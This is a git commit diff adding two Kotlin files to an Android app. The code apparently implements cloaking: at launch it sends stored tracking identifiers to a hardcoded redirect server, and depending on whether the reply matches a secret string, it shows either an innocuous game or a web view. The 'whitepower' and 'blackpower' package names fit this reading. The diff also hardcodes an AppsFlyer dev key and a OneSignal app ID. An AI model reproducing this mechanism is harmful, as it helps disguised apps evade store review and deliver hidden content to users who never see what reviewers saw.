e3674152c8849f25a299bda58a3b47106a1c871a
Dmitry Mobile <dmitrymobile@Dmitrys-MacBook-Pro.local>
2022-07-28 15:29:08 +0300

    main build

---
+++ app/src/main/java/com/tumb/blackpower/CNST.kt
@@ -0,0 +1,16 @@
+package com.tumb.blackpower
+
+object CNST {
+    const val AF_DEV_KEY = "uCZg7Njvvq3hMdStTfpeNH"
+    const val jsoupCheck = "6h3f"
+    const val ONESIGNAL_APP_ID = "873ef7b3-b736-4d11-9b6d-5582b7b599e3"
+
+    var lru = "http://azureprism.xyz/go.php?to=1&"
+
+
+    var odone = "sub_id_1="
+
+    var MAIN_ID: String? = ""
+    var C1: String? = "c11"
+    var D1: String? = "d11"
+}
---
+++ app/src/main/java/com/tumb/blackpower/Filter.kt
@@ -0,0 +1,85 @@
+package com.tumb.blackpower
+
+import android.content.Intent
+import androidx.appcompat.app.AppCompatActivity
+import android.os.Bundle
+import android.util.Log
+import com.orhanobut.hawk.Hawk
+import com.tumb.R
+import com.tumb.blackpower.CNST.C1
+import com.tumb.blackpower.CNST.D1
+import com.tumb.whitepower.Game
+import kotlinx.android.synthetic.main.activity_filter.*
+import kotlinx.coroutines.*
+import java.net.HttpURLConnection
+import java.net.URL
+
+class Filter  : AppCompatActivity() {
+    lateinit var jsoup: String
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_filter)
+
+        jsoup = ""
+
+        val job = GlobalScope.launch(Dispatchers.IO) {
+            jsoup = coroutineTask()
+        }
+
+        runBlocking {
+            try {
+                job.join()
+
+                txtMain.text = jsoup
+
+                if (jsoup == CNST.jsoupCheck) {
+                    Intent(applicationContext, Game::class.java).also { startActivity(it) }
+                } else {
+                    Intent(applicationContext, Web::class.java).also { startActivity(it) }
+                }
+                finish()
+            } catch (e: Exception) {
+
+            }
+        }
+
+    }
+
+    private suspend fun coroutineTask(): String {
+        val hawk: String? = Hawk.get(C1, "null")
+        val hawkAppLink: String? = Hawk.get(D1, "null")
+
+        val forJsoupSetNaming: String = CNST.lru + CNST.odone + hawk
+        val forJsoupSetAppLnk: String = CNST.lru + CNST.odone + hawkAppLink
+
+        withContext(Dispatchers.IO) {
+            //changed logical null to string null
+            if (hawk != "null") {
+                getCodeFromUrl(forJsoupSetNaming)
+                Log.d("Check1C", forJsoupSetNaming)
+            } else {
+                getCodeFromUrl(forJsoupSetAppLnk)
+                Log.d("Check1C", forJsoupSetAppLnk)
+            }
+        }
+        return jsoup
+    }
+
+    private fun getCodeFromUrl(link: String) {
+        val url = URL(link)
+        val urlConnection = url.openConnection() as HttpURLConnection
+
+        try {
+            val text = urlConnection.inputStream.bufferedReader().readText()
+            if (text.isNotEmpty()) {
+                jsoup = text
+            } else {
+            }
+        } catch (ex: Exception) {
+
+        } finally {
+            urlConnection.disconnect()
+        }
+    }
+}
